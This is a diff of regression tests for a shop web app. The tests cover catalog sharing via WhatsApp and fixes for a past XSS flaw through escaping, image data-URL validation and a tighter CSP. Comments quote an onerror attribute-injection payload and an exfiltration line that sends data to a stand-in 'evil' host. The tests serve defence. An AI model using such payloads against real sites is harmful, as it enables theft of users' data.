@@ -1218,10 +1218,11 @@ describe('Perfil del negocio', () => {
     expect(cuerpo).toMatch(/slice\(0, this\._NEGOCIO_LIMITES\[campo\]\)/);
   });
 
-  it('el logo solo acepta data URLs de imagen', () => {
-    // Va directo a un src: un string arbitrario sería un vector
+  it('el logo solo acepta data URLs de imagen, validando toda la cadena', () => {
+    // Va directo a un src. Validar solo el prefijo dejaba pasar
+    // `data:image/png,x" onerror="…` — explotable restaurando un backup.
     const idx = neg.indexOf('_sanitizarNegocio(datos)');
-    expect(neg.slice(idx, idx + 600)).toMatch(/\^data:image\\\//);
+    expect(neg.slice(idx, idx + 700)).toMatch(/this\.esImagenSegura\(datos\.logo\)/);
   });
 
   it('el logo reusa el pipeline de fotos que redimensiona y comprime', () => {
@@ -1286,5 +1287,122 @@ describe('Planes — solo hay dos, y se llaman igual en todos lados', () => {
 
   it('isPro es un booleano, no un nivel', () => {
     expect(cuenta).toMatch(/isPro\(\) \{\s*\n\s*return !!\(this\._account\?\.license\);/);
+  });
+});
+
+describe('Catálogo — el camino de las imágenes es visible', () => {
+  const dm = read('src/app/10-data-management.js');
+  const screen = read('src/screens/catalogo.html');
+
+  it('el mensaje se arma en un solo lugar', () => {
+    // Estaba dentro de enviarCatalogoTexto, así que la imagen viajaba sin
+    // precios ni contacto
+    expect(dm).toMatch(/_catalogoMensaje\(\) \{/);
+    const idx = dm.indexOf('enviarCatalogoTexto()');
+    expect(dm.slice(idx, idx + 300)).toMatch(/this\._catalogoMensaje\(\)/);
+  });
+
+  it('al compartir imágenes el texto va como epígrafe', () => {
+    const idx = dm.indexOf('async enviarCatalogo()');
+    const cuerpo = dm.slice(idx, idx + 1800);
+    expect(cuerpo).toMatch(/\{ files, text: texto \}/);
+    // Y si el navegador rechaza la combinación, manda igual la imagen
+    expect(cuerpo).toMatch(/navigator\.canShare\(conTexto\) \? conTexto : \{ files \}/);
+  });
+
+  it('Enviar genera las imágenes si no hay vista previa', () => {
+    // Antes: `if (this._catalogoImages.length === 0) return;` — salía en
+    // silencio y el usuario no entendía por qué no pasaba nada
+    const idx = dm.indexOf('async enviarCatalogo()');
+    const cuerpo = dm.slice(idx, idx + 700);
+    expect(cuerpo).toMatch(/await this\.previewCatalogo\(\)/);
+    expect(cuerpo).toMatch(/Seleccioná al menos un perfume/);
+  });
+
+  it('los dos botones están siempre visibles y dicen qué hacen', () => {
+    // El de imágenes tenía display:none hasta apretar "Vista previa": el
+    // camino que manda imágenes era invisible y el usuario apretaba el de
+    // texto pensando que mandaba todo
+    expect(screen).not.toMatch(/id="btn-catalogo-send"[^>]*display:none/);
+    expect(dm).not.toMatch(/getElementById\('btn-catalogo-send'\)\.style\.display/);
+    expect(screen).toMatch(/Enviar con imágenes/);
+    expect(screen).toMatch(/Enviar solo el listado en texto/);
+  });
+
+  it('explica por qué las imágenes no van por el link de WhatsApp', () => {
+    expect(screen).toMatch(/WhatsApp no deja mandar imágenes desde un link/);
+  });
+});
+
+describe('Inyección en atributos — la raíz del XSS de 07/2026', () => {
+  const utils = read('src/app/11-utils.js');
+  const render = read('src/app/02-render.js');
+  const stock = read('src/app/04-stock.js');
+  const neg = read('src/app/27-negocio.js');
+  const clientes = read('src/app/18-clientes.js');
+  const dm = read('src/app/10-data-management.js');
+  const headers = read('_headers');
+
+  it('existe escAttr y escapa comillas (esc no las escapa)', () => {
+    // esc() usa textContent→innerHTML, que NO escapa " ni '. Servía para
+    // texto pero se estaba usando en atributos: verificado explotable.
+    const idx = utils.indexOf('escAttr(s) {');
+    expect(idx, 'falta escAttr').toBeGreaterThan(-1);
+    const cuerpo = utils.slice(idx, idx + 400);
+    expect(cuerpo).toMatch(/&quot;/);
+    expect(cuerpo).toMatch(/&#39;/);
+  });
+
+  it('los data URL de imagen se validan completos, no por prefijo', () => {
+    // `^data:image/` dejaba pasar `data:image/png,x" onerror="…`
+    expect(utils).toMatch(/_IMG_DATA_URL:.*base64,\[A-Za-z0-9\+\/\]/);
+    expect(utils).toMatch(/esImagenSegura\(v\)/);
+    // Y SVG queda afuera: en otros contextos puede llevar scripts
+    expect(utils).not.toMatch(/_IMG_DATA_URL:.*svg/);
+  });
+
+  it('ningún nombre de usuario entra a un atributo con esc()', () => {
+    for (const [nombre, src] of [['render', render], ['clientes', clientes],
+                                 ['recordatorios', read('src/app/20-recordatorios.js')]]) {
+      expect(src, `${nombre}: esc() dentro de un atributo`)
+        .not.toMatch(/(aria-label|title|alt|value|data-value)="[^"]*\$\{this\.esc\(/);
+    }
+  });
+
+  it('las imágenes van por imgSrc, nunca crudas', () => {
+    for (const [nombre, src] of [['stock', stock], ['negocio', neg], ['data-mgmt', dm]]) {
+      const crudas = (src.match(/<img[^>]*src="\$\{(?!this\.imgSrc)/g) || []);
+      expect(crudas, `${nombre}: img con src sin validar`).toEqual([]);
+    }
+  });
+
+  it('el onclick del cliente no arma el string a mano', () => {
+    // Antes: .replace(/'/g,"\\'"). Un backslash lo rompía. Y
+    // encodeURIComponent solo NO escapa el apóstrofo — de ahí el %27.
+    expect(clientes).toMatch(/encodeURIComponent\(c\.key\)\.replace\(\/'\/g, '%27'\)/);
+    expect(clientes).not.toMatch(/replace\(\/'\/g, "\\\\\\\\'"\)/);
+  });
+
+  it('un backup no puede meter una foto envenenada en la base', () => {
+    expect(dm).toMatch(/_sanearImportado\(store, item\)/);
+    expect(dm).toMatch(/DB\.put\(store, this\._sanearImportado\(store, item\)\)/);
+  });
+
+  it('la CSP no deja sacar datos por img-src', () => {
+    // Con `img-src ... https:`, un XSS exfiltraba con
+    // `new Image().src='https://evil/?d='+datos` y la CSP no lo frenaba.
+    // Ninguna imagen de la app es externa.
+    const img = headers.match(/img-src[^;]*/)[0];
+    expect(img, 'img-src permite cualquier https').not.toMatch(/https:/);
+    expect(img).toMatch(/'self' data: blob:/);
+  });
+
+  it('la CSP no tiene permisos para servicios que no se usan', () => {
+    // Las fuentes son locales y OneSignal no tiene SDK en el cliente
+    expect(headers).not.toMatch(/fonts\.googleapis\.com/);
+    expect(headers).not.toMatch(/onesignal/);
+    // Lo que sí se usa sigue permitido
+    expect(headers).toMatch(/cdnjs\.cloudflare\.com/);
+    expect(headers).toMatch(/plausible\.io/);
   });
 });
